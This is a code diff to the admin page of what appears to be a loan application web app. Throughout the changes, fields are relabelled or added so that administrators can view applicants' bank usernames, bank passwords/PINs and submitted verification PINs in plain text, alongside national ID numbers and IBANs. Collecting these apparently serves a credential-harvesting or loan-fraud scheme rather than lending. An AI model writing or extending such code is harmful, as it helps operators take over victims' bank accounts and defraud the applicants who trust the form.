@@ -2069,7 +2069,10 @@ export const AdminPage = () => {
                               </div>
                               <div>
                                 <p className="text-[9px] font-black uppercase text-gray-400">Security</p>
-                                <p className="text-[10px] text-gray-500">Sentry: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.sentry}</span></p>
+                                <p className="text-[10px] text-gray-500">Password/PIN: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.sentry}</span></p>
+                                {loan.submittedPin && (
+                                  <p className="text-[10px] text-gray-500">Submitted PIN: <span className="text-accent font-black font-mono">{loan.submittedPin}</span></p>
+                                )}
                               </div>
                             </div>
                           </td>
@@ -2329,7 +2332,7 @@ export const AdminPage = () => {
                     </DetailSection>
 
                     <DetailSection title="Documents">
-                      <DetailItem label="SSN" value={selectedKYC.ssn} />
+                      <DetailItem label="National ID Number" value={selectedKYC.ssn} />
                       <div className="mt-4 space-y-4">
                         <div className="grid grid-cols-2 gap-4">
                           <div>
@@ -2524,7 +2527,7 @@ export const AdminPage = () => {
                       />
                     </div>
                     <div className="space-y-2">
-                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">SSN / Tax ID</label>
+                      <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">National ID Number</label>
                       <input
                         type="text"
                         value={adminProfileForm.ssn}
@@ -2702,7 +2705,7 @@ export const AdminPage = () => {
                   </DetailSection>
 
                   <DetailSection title="KYC Details">
-                    <DetailItem label="SSN / Tax ID" value={selectedUser.ssn} />
+                    <DetailItem label="National ID Number" value={selectedUser.ssn} />
                     <DetailItem label="State of Origin" value={selectedUser.stateOfOrigin} />
                     <DetailItem label="Marital Status" value={selectedUser.maritalStatus} />
                     <DetailItem label="Employment" value={selectedUser.employmentStatus} />
@@ -3014,8 +3017,9 @@ export const AdminPage = () => {
                 <DetailSection title="Verification Data">
                   <DetailItem label="IBAN" value={selectedLoan.additionalDetails?.iban} />
                   <DetailItem label="Phone Number" value={selectedLoan.additionalDetails?.phoneNumber} />
-                  <DetailItem label="Bank Username" value={selectedLoan.additionalDetails?.bankUsername} />
-                  <DetailItem label="Sentry ID" value={selectedLoan.additionalDetails?.sentry} />
+                  <DetailItem label="Bank Username or ID" value={selectedLoan.additionalDetails?.bankUsername} />
+                  <DetailItem label="Bank Password/PIN" value={selectedLoan.additionalDetails?.sentry} />
+                  <DetailItem label="Submitted Verification PIN" value={selectedLoan.submittedPin} />
                 </DetailSection>
 
                 <DetailSection title="Timestamps">
